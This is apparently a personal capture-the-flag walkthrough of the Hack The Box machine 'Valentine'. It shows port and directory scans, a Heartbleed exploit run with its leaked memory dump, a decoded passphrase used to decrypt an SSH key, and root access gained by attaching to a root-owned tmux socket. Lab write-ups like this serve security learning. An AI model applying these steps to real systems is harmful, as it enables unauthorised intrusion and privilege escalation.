
# Enumeration
## Nmap port scan

```
nmap -sC -sV valentine.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 21:26 EST
Nmap scan report for valentine.htb (10.129.210.224)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22
|_ssl-date: 2023-02-14T02:26:49+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: Host: 10.10.10.136; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.29 seconds
```

version OpenSSH 5.9p1

## Feroxbuster

https://github.com/epi052/feroxbuster

```
feroxbuster -u http://valentine.htb -k
http://valentine.htb/dev/
http://valentine.htb/index
http://valentine.htb/server-status
http://valentine.htb/encode
```

## Gobuster

```
gobuster dir -u http://valentine.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://valentine.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/13 21:54:30 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 290]
/cgi-bin/             (Status: 403) [Size: 289]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 301) [Size: 312] [--> http://valentine.htb/dev/]
/encode               (Status: 200) [Size: 554]
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/server-status        (Status: 403) [Size: 294]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/13 21:55:55 Finished
===============================================================
```

## Check the website

![[Pasted image 20230214160209.png]]

## Searchsploit
```
searchsploit heartbleed
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Mult | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)           | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Sup | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure              | multiple/remote/32745.py
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

### multiple/remote/32764.py

```
python2.7 32764.py valentine.htb | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Trying SSL 3.0...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0300, length = 94
 ... received message: type = 22, ver = 0300, length = 885
 ... received message: type = 22, ver = 0300, length = 331
 ... received message: type = 22, ver = 0300, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0300, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D FA  mV0aGVoeXBlCg==.
  0160: B2 0D FB 61 19 7E E0 70 C0 60 57 8A 26 E0 DF 36  ...a.~.p.`W.&..6
  0170: 6C 50 09 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  lP..............

WARNING: server returned more data than it should - server is vulnerable!

```

### Dump2text

```
python2.7 32764.py valentine.htb | grep -E "([0-9A-F]{2} ){16}"  | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > dump
xxd -r dump > dump2string.txt

```

`$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`

## Check websites

### /dev
![[Pasted image 20230214120019.png]]
hype_key
notes.txt are there

### /decode
![[Pasted image 20230214120003.png]]

### /encode
![[Pasted image 20230214115947.png]]


### Decode the file from dump
```
Your input:

aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Your encoded input:

heartbleedbelievethehype 
```


# Foothold

## Get Hype's shell
## hype_key

hype_key from the website is written in hex, so we use xxd to decode it. The result is rsa key for a user hype.
```
xxd -r -p hype_key > hype_key_xxd
```

### Decode RSA
use the passphrase `heartbleedbelievethehype`
```
openssl rsa -in hype_key_xxd -out hype.rsa  
```


### Connection
```
ssh -i hype.rsa hype@valentine.htb         
sign_and_send_pubkey: no mutual signature supported
```

```
ssh  -o 'PubkeyAcceptedKeyTypes +ssh-rsa'  -i hype.rsa hype@valentine.htb
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
```

### Flag
user flag is in the Desktop


# Privilege Escalation
## Enumeration

### sudo -l
The passphrase did not work, so we cannot do it?

### history
```
hype@Valentine:~/Desktop$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess 
   10  tmux a -t dev_sess 
   11  tmux --help
   12  tmux -S /.devs/dev_sess 
   13  exit
```

### ps aux | grep root
```
root       1203  0.0  0.1  26416  1680 ?        Ss   18:23   0:03 /usr/bin/tmux -S /.devs/dev_sess
```
tmux??

### man tmux
```
-L socket-name
                   tmux stores the server socket in a directory under /tmp (or TMPDIR if set); the default
                   socket is named default.  This option allows a different socket name to be specified,
                   allowing several independent tmux servers to be run.  Unlike -S a full path is not neces‐
                   sary: the sockets are all created in the same directory.

                   If the socket is accidentally removed, the SIGUSR1 signal may be sent to the tmux server
                   process to recreate it.
```


```
-S socket-path
                   Specify a full alternative path to the server socket.  If -S is specified, the default
                   socket directory is not used and any -L flag is ignored.
```

### tmux options
`/.devs/dev_sess`

```
ls -al
total 8
drwxr-xr-x  2 root hype 4096 Feb 13 18:23 .
drwxr-xr-x 26 root root 4096 Aug 25 03:02 ..
srw-rw----  1 root hype    0 Feb 13 18:23 dev_sess
```

Zero bytes?
It is owned by root but its group is hype.

There is a socket with loose permissions
```
hype@Valentine:/.devs$ file dev_sess
dev_sess: socket
```

![[Pasted image 20230214161452.png]]
## root
```
hype@Valentine:/.devs$ tmux -S dev_sess
root@Valentine:/.devs# whoami
root

```